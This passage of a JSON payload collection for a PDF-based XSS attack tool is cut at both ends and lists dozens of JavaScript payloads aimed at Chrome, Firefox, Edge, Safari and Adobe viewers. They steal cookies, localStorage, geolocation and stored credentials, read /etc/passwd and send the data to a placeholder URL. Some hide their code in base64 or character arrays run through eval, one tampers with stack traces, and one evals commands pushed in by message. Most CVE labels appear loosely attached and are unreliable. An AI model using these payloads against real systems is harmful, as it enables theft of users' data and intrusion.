      "cve_reference": "CVE-2019-11707, CVE-2021-23961",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 75,
      "payload_length": 1319,
      "last_updated": "2025-07-30T14:38:01.949144"
    },
    {
      "id": "advanced_xss_012",
      "category": "machine_learning_evasion",
      "browser": "edge",
      "technique": "edge_ml_evasion",
      "payload": "(function(){var chars=[32,40,102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,120,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,120,46,111,112,101,110,40,39,71,69,84,39,44,39,123,117,114,108,125,63,101,100,103,101,95,109,108,95,101,118,97,115,105,111,110,61,39,43,68,97,116,101,46,110,111,119,40,41,44,116,114,117,101,41,59,120,46,115,101,110,100,40,41,59,125,41,40,41,59];var payload='';for(var i=0;i<chars.length;i++){payload+=String.fromCharCode(chars[i]);}try{var func=new Function(payload);setTimeout(func,Math.random()*1000+500);}catch(e){try{window.open('{url}?edge_ml_evasion_failed='+encodeURIComponent(e.toString()),'_blank');}catch(e2){app.alert('Edge ML evasion failed: '+e2);}}}());",
      "description": "Microsoft Edge machine learning evasion using dynamic character array reconstruction",
      "risk_level": "medium",
      "cve_reference": "CVE-2020-0674, CVE-2021-26411",
      "detected_techniques": [
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 75,
      "payload_length": 733,
      "last_updated": "2025-07-30T14:38:01.949250"
    },
    {
      "id": "chrome_003",
      "category": "dom_access",
      "technique": "postmessage_exploit",
      "payload": "try { if(typeof parent !== 'undefined' && parent.postMessage) parent.postMessage({type:'xss',payload:'chrome_pdf',url:'{url}'}, '*'); } catch(e) { }",
      "description": "Chrome PDFium PostMessage exploitation for data exfiltration",
      "risk_level": "medium",
      "browser": "chrome",
      "detected_techniques": [
        "dom_manipulation",
        "postmessage_abuse"
      ],
      "quality_score": 70,
      "payload_length": 148,
      "last_updated": "2025-07-30T14:38:01.947151"
    },
    {
      "id": "firefox_011",
      "category": "file_system",
      "technique": "fetch_proc_version",
      "payload": "try { fetch('file:///proc/version').then(r => r.text()).then(d => location = '{url}?version=' + btoa(d)); } catch(e) { }",
      "description": "Firefox PDF.js file system access to read system version information",
      "risk_level": "high",
      "browser": "firefox",
      "detected_techniques": [
        "network_exfiltration",
        "file_access"
      ],
      "quality_score": 70,
      "payload_length": 120,
      "last_updated": "2025-07-30T14:38:01.947823"
    },
    {
      "id": "advanced_xss_005",
      "category": "network_exfiltration",
      "browser": "edge",
      "technique": "edge_fetch_api_exfiltration",
      "payload": "(function(){var data={browser:'edge',timestamp:new Date().toISOString(),url:location.href,userAgent:navigator.userAgent,platform:navigator.platform,cookies:document.cookie||'none',localStorage:JSON.stringify(localStorage)||'none'};try{if(typeof fetch!=='undefined'){fetch('{url}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(e){console.log('Fetch failed:',e);});}else{var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}}catch(e){try{navigator.sendBeacon('{url}?edge_beacon='+encodeURIComponent(JSON.stringify(data)));}catch(e2){app.alert('Edge network exfiltration failed: '+e2);}}}());",
      "description": "Microsoft Edge data exfiltration using Fetch API with sendBeacon fallback",
      "risk_level": "high",
      "cve_reference": "CVE-2020-0674, CVE-2021-26411, CVE-2022-21974",
      "detected_techniques": [
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 70,
      "payload_length": 731,
      "last_updated": "2025-07-30T14:38:01.949090"
    },
    {
      "id": "advanced_xss_008",
      "category": "timing_attack",
      "browser": "safari",
      "technique": "safari_timing_based_bypass",
      "payload": "(function(){var start=performance.now();var attempts=0;var maxAttempts=5;function timeBasedEvasion(){attempts++;try{if(typeof parent!=='undefined'&&parent.window){var timeDiff=performance.now()-start;if(timeDiff>100){parent.window.location.href='{url}?safari_timing='+(timeDiff)+'&attempt='+attempts;}else{setTimeout(timeBasedEvasion,50+Math.random()*100);}}}catch(e){if(attempts<maxAttempts){setTimeout(timeBasedEvasion,200+Math.random()*300);}else{try{window.open('{url}?safari_timing_final=failed&attempts='+attempts,'_blank');}catch(e2){app.alert('Safari timing attack exhausted: '+e2);}}}}timeBasedEvasion();})();",
      "description": "Safari timing-based evasion with performance monitoring and adaptive delays",
      "risk_level": "medium",
      "cve_reference": "CVE-2019-8625, CVE-2020-3899",
      "detected_techniques": [
        "dom_manipulation",
        "pdf_specific"
      ],
      "quality_score": 70,
      "payload_length": 618,
      "last_updated": "2025-07-30T14:38:01.949165"
    },
    {
      "id": "advanced_xss_009",
      "category": "polyglot",
      "browser": "chrome",
      "technique": "chrome_polyglot_payload",
      "payload": "/*<script>*/try{var/*</script><img src=x onerror=*/p=parent||top;if(p){p.location='/*'>*/{url}?polyglot=chrome&payload=*/'+btoa('chrome_polyglot_executed')/*'+'&time='+Date.now()*/;}/*</img>*/}catch(e){/*<svg onload=*/app.alert('Polyglot failed: '+e)/*>*/;}/*</svg>*//*</script>*/",
      "description": "Chrome polyglot payload combining JavaScript, HTML, and SVG vectors",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418",
      "detected_techniques": [
        "dom_manipulation",
        "pdf_specific"
      ],
      "quality_score": 70,
      "payload_length": 280,
      "last_updated": "2025-07-30T14:38:01.949180"
    },
    {
      "id": "advanced_xss_016",
      "category": "shared_array_buffer",
      "browser": "chrome",
      "technique": "chrome_shared_array_buffer",
      "payload": "(function(){try{if(typeof SharedArrayBuffer!=='undefined'){var sab=new SharedArrayBuffer(1024);var view=new Uint8Array(sab);var payload='chrome_shared_array_buffer_exploitation';for(var i=0;i<payload.length;i++){view[i]=payload.charCodeAt(i);}var worker=new Worker(URL.createObjectURL(new Blob(['var sab=new SharedArrayBuffer(1024);var view=new Uint8Array(sab);postMessage(\"worker_ready\");onmessage=function(e){if(e.data instanceof SharedArrayBuffer){var view=new Uint8Array(e.data);var str=\"\";for(var i=0;i<view.length&&view[i]!==0;i++){str+=String.fromCharCode(view[i]);}fetch(\"{url}?chrome_sab=\"+encodeURIComponent(str));}}'],{type:'application/javascript'})));worker.postMessage(sab);}else{throw new Error('SharedArrayBuffer not available');}}catch(e){try{var x=new XMLHttpRequest();x.open('GET','{url}?chrome_sab_failed='+encodeURIComponent(e.toString()),true);x.send();}catch(e2){app.alert('Chrome SharedArrayBuffer exploitation failed: '+e2);}}}());",
      "description": "Chrome SharedArrayBuffer exploitation with Web Worker communication",
      "risk_level": "critical",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "postmessage_abuse",
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 70,
      "payload_length": 956,
      "last_updated": "2025-07-30T14:38:01.949364"
    },
    {
      "id": "advanced_xss_019",
      "category": "mutation_observer",
      "browser": "safari",
      "technique": "safari_mutation_observer",
      "payload": "(function(){try{if(typeof MutationObserver!=='undefined'){var observer=new MutationObserver(function(mutations){mutations.forEach(function(mutation){if(mutation.type==='childList'&&mutation.addedNodes.length>0){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'safari',type:'mutation_observer',mutationType:mutation.type,addedNodes:mutation.addedNodes.length,timestamp:Date.now()}));observer.disconnect();}});});observer.observe(document.body,{childList:true,subtree:true});var trigger=document.createElement('span');trigger.textContent='xss_trigger';document.body.appendChild(trigger);}else{throw new Error('MutationObserver not supported');}}catch(e){try{navigator.sendBeacon('{url}?safari_mutation_failed='+encodeURIComponent(e.toString()));}catch(e2){app.alert('Safari MutationObserver exploitation failed: '+e2);}}}());",
      "description": "Safari MutationObserver exploitation for DOM change detection and triggering",
      "risk_level": "medium",
      "cve_reference": "CVE-2019-8625, CVE-2020-3899",
      "detected_techniques": [
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 70,
      "payload_length": 915,
      "last_updated": "2025-07-30T14:38:01.949444"
    },
    {
      "id": "advanced_xss_023",
      "category": "credential_management",
      "browser": "chrome",
      "technique": "chrome_credential_management",
      "payload": "(function(){try{if(typeof navigator.credentials!=='undefined'){navigator.credentials.get({password:true,federated:{providers:['https://accounts.google.com','https://www.facebook.com']}}).then(function(credential){if(credential){var data={browser:'chrome',type:'credential_management',credentialType:credential.type,id:credential.id,timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}else{throw new Error('No credentials available');}}).catch(function(e){throw e;});}else{throw new Error('Credential Management API not supported');}}catch(e){try{var x=new XMLHttpRequest();x.open('GET','{url}?chrome_credential_failed='+encodeURIComponent(e.toString()),true);x.send();}catch(e2){app.alert('Chrome Credential Management exploitation failed: '+e2);}}}());",
      "description": "Chrome Credential Management API exploitation for stored credential access",
      "risk_level": "critical",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 70,
      "payload_length": 862,
      "last_updated": "2025-07-30T14:38:01.949572"
    },
    {
      "id": "advanced_xss_024",
      "category": "performance_timeline",
      "browser": "safari",
      "technique": "safari_performance_timeline",
      "payload": "(function(){try{if(typeof performance!=='undefined'&&typeof performance.getEntriesByType!=='undefined'){var entries=performance.getEntriesByType('navigation');var timing=performance.timing;var data={browser:'safari',type:'performance_timeline',navigationEntries:entries.length,timing:{loadEventEnd:timing.loadEventEnd,domContentLoadedEventEnd:timing.domContentLoadedEventEnd,responseEnd:timing.responseEnd},timestamp:Date.now()};var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify(data));}else{throw new Error('Performance Timeline API not supported');}}catch(e){try{navigator.sendBeacon('{url}?safari_performance_failed='+encodeURIComponent(e.toString()));}catch(e2){app.alert('Safari Performance Timeline exploitation failed: '+e2);}}}());",
      "description": "Safari Performance Timeline API exploitation for timing information disclosure",
      "risk_level": "low",
      "cve_reference": "CVE-2019-8625, CVE-2020-3899",
      "detected_techniques": [
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 70,
      "payload_length": 820,
      "last_updated": "2025-07-30T14:38:01.949599"
    },
    {
      "id": "xss_pdf_0001",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_1_1",
      "payload": "eval(atob('dHJ5IHsgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICd7dXJsfSc7IH0gY2F0Y2goZSkgeyBhcHAuYWxlcnQoJ0Nocm9tZSBibG9ja2VkOiAnICsgZSk7IH0='))",
      "description": "Chrome PDFium DOM access via try { parent.window.location =... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 65,
      "payload_length": 134,
      "last_updated": "2025-07-30T14:38:01.946841"
    },
    {
      "id": "xss_pdf_0004",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_2_1",
      "payload": "eval(atob('dHJ5IHsgdG9wLmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gJzxoMT5DaHJvbWUgUERGaXVtIERPTSBYU1M8L2gxPjxzY3JpcHQ+bG9jYXRpb249Int1cmx9Ijwvc2NyaXB0Pic7IH0gY2F0Y2goZSkgeyB9'))",
      "description": "Chrome PDFium DOM access via try { top.document.body.innerH... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 65,
      "payload_length": 170,
      "last_updated": "2025-07-30T14:38:01.946862"
    },
    {
      "id": "xss_pdf_0007",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_3_1",
      "payload": "eval(atob('dHJ5IHsgd2luZG93Lm9wZW5lci5ldmFsKCdhbGVydCgiQ2hyb21lIFhTUyB2aWEgb3BlbmVyIik7IGxvY2F0aW9uPSJ7dXJsfSInKTsgfSBjYXRjaChlKSB7IH0='))",
      "description": "Chrome PDFium DOM access via try { window.opener.eval('aler... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 65,
      "payload_length": 138,
      "last_updated": "2025-07-30T14:38:01.946884"
    },
    {
      "id": "xss_pdf_0010",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_4_1",
      "payload": "eval(atob('dHJ5IHsgZnJhbWVzWzBdLmxvY2F0aW9uID0gJ3t1cmx9JzsgfSBjYXRjaChlKSB7IGFwcC5sYXVuY2hVUkwoJ3t1cmx9Jyk7IH0='))",
      "description": "Chrome PDFium DOM access via try { frames[0].location = '{u... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 65,
      "payload_length": 114,
      "last_updated": "2025-07-30T14:38:01.946905"
    },
    {
      "id": "xss_pdf_0016",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_6_1",
      "payload": "eval(atob('dHJ5IHsgcGFyZW50LnBvc3RNZXNzYWdlKHt7dHlwZToneHNzJyxwYXlsb2FkOidjaHJvbWVfcGRmJyx1cmw6J3t1cmx9J319LCAnKicpOyB9IGNhdGNoKGUpIHsgfQ=='))",
      "description": "Chrome PDFium DOM access via try { parent.postMessage({{typ... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 65,
      "payload_length": 142,
      "last_updated": "2025-07-30T14:38:01.946948"
    },
    {
      "id": "xss_pdf_0019",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_7_1",
      "payload": "eval(atob('d2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ21lc3NhZ2UnLCBmdW5jdGlvbihlKSB7eyBpZihlLmRhdGEuY21kKSBldmFsKGUuZGF0YS5jbWQpOyB9fSk7'))",
      "description": "Chrome PDFium DOM access via window.addEventListener('messa... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 65,
      "payload_length": 130,
      "last_updated": "2025-07-30T14:38:01.946969"
    },
    {
      "id": "firefox_003",
      "category": "csp_bypass",
      "technique": "function_constructor",
      "payload": "try { Function('return typeof parent !== \"undefined\" ? parent : window')().location = '{url}'; } catch(e) { }",
      "description": "Firefox PDF.js CSP bypass using Function constructor",
      "risk_level": "high",
      "browser": "firefox",
      "detected_techniques": [
        "dom_manipulation",
        "dynamic_execution"
      ],
      "quality_score": 65,
      "payload_length": 109,
      "last_updated": "2025-07-30T14:38:01.947730"
    },
    {
      "id": "advanced_xss_001",
      "category": "sandbox_escape",
      "browser": "chrome",
      "technique": "advanced_chrome_sandbox_escape",
      "payload": "(function(){try{var p=parent||top||window.parent;if(p&&p.window){var d=p.document||p.window.document;if(d){var f=d.createElement('form');f.method='POST';f.action='{url}?type=chrome_escape';var i=d.createElement('input');i.name='data';i.value='chrome_sandbox_escaped:'+navigator.userAgent+'|'+document.location.href+'|'+document.cookie;f.appendChild(i);d.body.appendChild(f);f.submit();}}}catch(e){try{app.getURL({url:'{url}?chrome_fallback='+encodeURIComponent(e.toString())});}catch(e2){console.log('Chrome XSS blocked:',e2);}}})();",
      "description": "Chrome PDFium sandbox escape via form submission with fallback URL launching",
      "risk_level": "critical",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166, CVE-2022-0971",
      "detected_techniques": [
        "dom_manipulation"
      ],
      "quality_score": 65,
      "payload_length": 533,
      "last_updated": "2025-07-30T14:38:01.949000"
    },
    {
      "id": "advanced_xss_004",
      "category": "command_execution",
      "browser": "adobe",
      "technique": "adobe_acrobat_cmd_exec",
      "payload": "try{if(app.execMenuItem){app.execMenuItem('Print');}var payload='app.launchURL(\"{url}?adobe_exec=\"+encodeURIComponent(app.viewerVersion+\"|\"+app.platform+\"|\"+app.language));';eval(payload);}catch(e){try{app.getURL({url:'{url}?adobe_geturl='+encodeURIComponent(e.toString())+'&ver='+app.viewerVersion});}catch(e2){try{this.submitForm('{url}?adobe_submit=error');}catch(e3){app.alert('Adobe execution blocked: '+e3);}}}",
      "description": "Adobe Acrobat command execution via execMenuItem and launchURL with version detection",
      "risk_level": "critical",
      "cve_reference": "CVE-2018-4990, CVE-2019-7839, CVE-2020-3793",
      "detected_techniques": [
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 65,
      "payload_length": 416,
      "last_updated": "2025-07-30T14:38:01.949064"
    },
    {
      "id": "advanced_xss_011",
      "category": "anti_forensics",
      "browser": "adobe",
      "technique": "adobe_anti_forensics",
      "payload": "try{var payload=String.fromCharCode(116,114,121,123,97,112,112,46,103,101,116,85,82,76,40,123,117,114,108,58,39,123,117,114,108,125,63,97,100,111,98,101,95,97,110,116,105,95,102,111,114,101,110,115,105,99,115,61,39,43,101,110,99,111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,40,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,41,125,41,59,125,99,97,116,99,104,40,101,41,123,97,112,112,46,97,108,101,114,116,40,39,65,110,116,105,45,102,111,114,101,110,115,105,99,115,32,102,97,105,108,101,100,58,32,39,43,101,41,59,125);eval(payload);var trace=new Error().stack;if(trace){var cleanTrace=trace.replace(/eval/g,'exec').replace(/anonymous/g,'function');}}catch(e){app.alert('Adobe anti-forensics blocked: '+e);}",
      "description": "Adobe anti-forensics payload using character code obfuscation and stack trace manipulation",
      "risk_level": "high",
      "cve_reference": "CVE-2018-4990, CVE-2019-7839",
      "detected_techniques": [
        "dynamic_execution",
        "pdf_specific"
      ],
      "quality_score": 65,
      "payload_length": 752,
      "last_updated": "2025-07-30T14:38:01.949226"
    },
    {
      "id": "firefox_005",
      "category": "network_exfiltration",
      "technique": "fetch_data_exfil",
      "payload": "try { setInterval('fetch(\"{url}?ping=\" + Date.now())', 5000); } catch(e) { }",
      "description": "Firefox PDF.js periodic data exfiltration via fetch",
      "risk_level": "medium",
      "browser": "firefox",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 60,
      "payload_length": 76,
      "last_updated": "2025-07-30T14:38:01.947752"
    },
    {
      "id": "firefox_015",
      "category": "network_exfiltration",
      "technique": "xhr_data_exfil",
      "payload": "try { fetch('{url}', {method: 'POST', body: navigator.userAgent + '|' + location.href}); } catch(e) { }",
      "description": "Firefox PDF.js data exfiltration via XMLHttpRequest POST",
      "risk_level": "medium",
      "browser": "firefox",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 60,
      "payload_length": 103,
      "last_updated": "2025-07-30T14:38:01.947871"
    },
    {
      "id": "advanced_xss_020",
      "category": "indexeddb_exploitation",
      "browser": "chrome",
      "technique": "chrome_indexeddb_exploitation",
      "payload": "(function(){try{var request=indexedDB.open('XSSDatabase',1);request.onerror=function(e){throw new Error('IndexedDB open failed');};request.onupgradeneeded=function(e){var db=e.target.result;var objectStore=db.createObjectStore('payloads',{keyPath:'id'});objectStore.add({id:1,data:'chrome_indexeddb_exploitation',timestamp:Date.now()});};request.onsuccess=function(e){var db=e.target.result;var transaction=db.transaction(['payloads'],'readonly');var objectStore=transaction.objectStore('payloads');var getRequest=objectStore.get(1);getRequest.onsuccess=function(e){var result=e.target.result;if(result){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'chrome',type:'indexeddb_exploitation',data:result,timestamp:Date.now()}));}};db.close();};}catch(e){try{localStorage.setItem('xss_fallback',JSON.stringify({browser:'chrome',type:'indexeddb_failed',error:e.toString(),timestamp:Date.now()}));var x=new XMLHttpRequest();x.open('GET','{url}?chrome_indexeddb_failed='+encodeURIComponent(e.toString()),true);x.send();}catch(e2){app.alert('Chrome IndexedDB exploitation failed: '+e2);}}}());",
      "description": "Chrome IndexedDB exploitation for persistent data storage and retrieval",
      "risk_level": "medium",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418",
      "detected_techniques": [
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 60,
      "payload_length": 1179,
      "last_updated": "2025-07-30T14:38:01.949481"
    },
    {
      "id": "advanced_xss_022",
      "category": "payment_request_api",
      "browser": "edge",
      "technique": "edge_payment_request_api",
      "payload": "(function(){try{if(typeof PaymentRequest!=='undefined'){var methods=[{supportedMethods:'basic-card',data:{supportedNetworks:['visa','mastercard']}}];var details={total:{label:'XSS Test',amount:{currency:'USD',value:'0.01'}},displayItems:[{label:'XSS Payload',amount:{currency:'USD',value:'0.01'}}]};var options={requestPayerName:true,requestPayerEmail:true};var request=new PaymentRequest(methods,details,options);request.show().then(function(response){var x=new XMLHttpRequest();x.open('POST','{url}',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({browser:'edge',type:'payment_request_api',payerName:response.payerName,payerEmail:response.payerEmail,timestamp:Date.now()}));response.complete('success');}).catch(function(e){throw e;});}else{throw new Error('PaymentRequest API not supported');}}catch(e){try{window.open('{url}?edge_payment_failed='+encodeURIComponent(e.toString()),'_blank');}catch(e2){app.alert('Edge PaymentRequest API exploitation failed: '+e2);}}}());",
      "description": "Microsoft Edge PaymentRequest API exploitation for user information disclosure",
      "risk_level": "high",
      "cve_reference": "CVE-2020-0674, CVE-2021-26411",
      "detected_techniques": [
        "network_exfiltration",
        "pdf_specific"
      ],
      "quality_score": 60,
      "payload_length": 1009,
      "last_updated": "2025-07-30T14:38:01.949542"
    },
    {
      "id": "xss_pdf_0013",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "dom_manipulation_chrome_5_1",
      "payload": "eval(atob('dHJ5IHsgcGFyZW50LmZyYW1lc1snbWFpbiddLmxvY2F0aW9uID0gJ3t1cmx9JzsgfSBjYXRjaChlKSB7IH0='))",
      "description": "Chrome PDFium DOM access via try { parent.frames['main'].lo... (obf: base64)",
      "risk_level": "high",
      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166",
      "detected_techniques": [
        "dynamic_execution"
      ],
      "quality_score": 55,
      "payload_length": 98,
      "last_updated": "2025-07-30T14:38:01.946927"
    },
    {
      "id": "chrome_015",
      "category": "dom_access",
      "technique": "geolocation_access",
      "payload": "try { app.launchURL('javascript:navigator.geolocation.getCurrentPosition(position=>fetch(\\'{url}/geolocation?lat=\\'+position.coords.latitude+\\'&lon=\\'+position.coords.longitude))', true); } catch(e) { }",
      "description": "Chrome PDF geolocation access and exfiltration",
      "risk_level": "medium",
      "browser": "chrome",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 55,
      "payload_length": 202,
      "last_updated": "2025-07-30T14:38:01.947287"
    },
    {
      "id": "safari_004",
      "category": "webkit_specific",
      "technique": "webkit_preview_handler",
      "payload": "try { window.webkit.messageHandlers.preview.postMessage({action: 'navigate', url: '{url}'}); } catch(e) { }",
      "description": "Safari PDFKit WebKit preview handler abuse for navigation",
      "risk_level": "high",
      "browser": "safari",
      "detected_techniques": [
        "postmessage_abuse"
      ],
      "quality_score": 55,
      "payload_length": 107,
      "last_updated": "2025-07-30T14:38:01.948423"
    },
    {
      "id": "chrome_001",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "parent_window_access",
      "payload": "try { if(typeof parent !== 'undefined' && parent.window) parent.window.location = '{url}'; } catch(e) { app.alert('Chrome blocked: ' + e); }",
      "description": "Chrome PDFium DOM access via parent window manipulation",
      "risk_level": "high",
      "detected_techniques": [
        "dom_manipulation",
        "pdf_specific"
      ],
      "quality_score": 50,
      "payload_length": 140,
      "last_updated": "2025-07-30T14:38:01.947124"
    },
    {
      "id": "chrome_002",
      "category": "dom_access",
      "technique": "top_document_access",
      "payload": "try { if(typeof top !== 'undefined' && top.document) top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"{url}\"</script>'; } catch(e) { }",
      "description": "Chrome PDFium DOM manipulation via top document access",
      "risk_level": "high",
      "browser": "chrome",
      "detected_techniques": [
        "dom_manipulation"
      ],
      "quality_score": 50,
      "payload_length": 164,
      "last_updated": "2025-07-30T14:38:01.947138"
    },
    {
      "id": "firefox_004",
      "category": "csp_bypass",
      "technique": "settimeout_bypass",
      "payload": "try { setTimeout('if(typeof parent !== \"undefined\") parent.location=\"{url}\"', 100); } catch(e) { }",
      "description": "Firefox PDF.js CSP bypass using setTimeout for delayed execution",
      "risk_level": "high",
      "browser": "firefox",
      "detected_techniques": [
        "dom_manipulation"
      ],
      "quality_score": 50,
      "payload_length": 98,
      "last_updated": "2025-07-30T14:38:01.947742"
    },
    {
      "id": "firefox_013",
      "category": "csp_bypass",
      "technique": "worker_thread_exploit",
      "payload": "try { var w = new Worker('data:text/javascript,postMessage(\"{url}\")'); } catch(e) { }",
      "description": "Firefox PDF.js worker thread exploitation for CSP bypass",
      "risk_level": "high",
      "browser": "firefox",
      "detected_techniques": [
        "postmessage_abuse"
      ],
      "quality_score": 50,
      "payload_length": 85,
      "last_updated": "2025-07-30T14:38:01.947846"
    },
    {
      "id": "safari_010",
      "category": "dom_access",
      "technique": "iframe_injection",
      "payload": "document.body.innerHTML='<iframe src=\"javascript:fetch(\\'{url}/iframe?domain=\\'+parent.document.domain)\"></iframe>'",
      "description": "Safari PDFKit iframe injection for parent context access",
      "risk_level": "high",
      "browser": "safari",
      "detected_techniques": [
        "dom_manipulation",
        "network_exfiltration"
      ],
      "quality_score": 50,
      "payload_length": 115,
      "last_updated": "2025-07-30T14:38:01.948459"
    },
    {
      "id": "firefox_006",
      "category": "file_system",
      "technique": "file_read_exfiltration",
      "payload": "fetch('file:///etc/passwd').then(r=>r.text()).then(t=>fetch('{url}/exfil?data='+encodeURIComponent(t)))",
      "description": "Firefox PDF.js file system access to read and exfiltrate /etc/passwd",
      "risk_level": "critical",
      "browser": "firefox",
      "detected_techniques": [
        "network_exfiltration",
        "file_access"
      ],
      "quality_score": 45,
      "payload_length": 103,
      "last_updated": "2025-07-30T14:38:01.947762"
    },
    {
      "id": "firefox_008",
      "category": "dom_access",
      "technique": "geolocation_exfiltration",
      "payload": "navigator.geolocation.getCurrentPosition(position=>fetch('{url}/geolocation?lat='+position.coords.latitude+'&lon='+position.coords.longitude))",
      "description": "Firefox PDF.js geolocation access and data exfiltration",
      "risk_level": "medium",
      "browser": "firefox",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 45,
      "payload_length": 142,
      "last_updated": "2025-07-30T14:38:01.947784"
    },
    {
      "id": "firefox_009",
      "category": "dom_access",
      "technique": "indexeddb_manipulation",
      "payload": "var request=indexedDB.open('malicious',1);request.onupgradeneeded=function(e){var db=e.target.result;var store=db.createObjectStore('data',{keyPath:'id'});store.add({id:1,value:'compromised'});fetch('{url}/indexeddb?status=created');}",
      "description": "Firefox PDF.js IndexedDB manipulation to create malicious database",
      "risk_level": "medium",
      "browser": "firefox",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 45,
      "payload_length": 234,
      "last_updated": "2025-07-30T14:38:01.947801"
    },
    {
      "id": "firefox_010",
      "category": "dom_access",
      "technique": "sessionstorage_exfiltration",
      "payload": "sessionStorage.setItem('userAuth','compromised');fetch('{url}/sessionstorage?data='+sessionStorage.getItem('userAuth'))",
      "description": "Firefox PDF.js sessionStorage manipulation and data exfiltration",
      "risk_level": "medium",
      "browser": "firefox",
      "detected_techniques": [
        "network_exfiltration"
      ],
      "quality_score": 45,
      "payload_length": 119,
      "last_updated": "2025-07-30T14:38:01.947811"
    },
    {
      "id": "safari_003",
      "category": "webkit_specific",
      "technique": "webkit_messagehandlers",
      "payload": "try { webkit.messageHandlers.exploit.postMessage('{url}'); } catch(e) { }",
      "description": "Safari PDFKit WebKit messageHandlers exploitation",
      "risk_level": "high",
      "browser": "safari",
      "detected_techniques": [
        "postmessage_abuse"
      ],
      "quality_score": 45,
      "payload_length": 73,
      "last_updated": "2025-07-30T14:38:01.948491"
    },
    {
      "id": "chrome_012",
      "category": "file_system",
      "technique": "form_submission_file_read",
      "payload": "this.submitForm({cURL: 'javascript:fetch(\\'file:///etc/passwd\\').then(r=>r.text()).then(t=>navigator.sendBeacon(\\'{url}/exfil\\',t))', cSubmitAs: 'PDF'});",
      "description": "Chrome PDF form submission to read local files and exfiltrate data",
      "risk_level": "critical",
      "browser": "chrome",
      "detected_techniques": [
        "network_exfiltration",
        "file_access"
      ],
      "quality_score": 40,
      "payload_length": 153,
      "last_updated": "2025-07-30T14:38:01.947248"
    },
    {
      "id": "firefox_012",
      "category": "file_system",
      "technique": "file_input_manipulation",
      "payload": "try { var input = document.createElement('input'); input.type = 'file'; input.webkitdirectory = true; input.click(); } catch(e) { }",
      "description": "Firefox PDF.js file input manipulation to access directory structure",
      "risk_level": "medium",
      "browser": "firefox",
      "detected_techniques": [],
      "quality_score": 40,
      "payload_length": 131,
      "last_updated": "2025-07-30T14:38:01.947836"
    },
    {
      "id": "firefox_014",
      "category": "csp_bypass",
      "technique": "document_write_bypass",
      "payload": "try { document.write('<script src=\"data:text/javascript,location=\\\"{url}\\\"\"></script>'); } catch(e) { }",
      "description": "Firefox PDF.js CSP bypass using document.write with data URI",
      "risk_level": "high",
      "browser": "firefox",
      "detected_techniques": [],
      "quality_score": 40,
      "payload_length": 103,
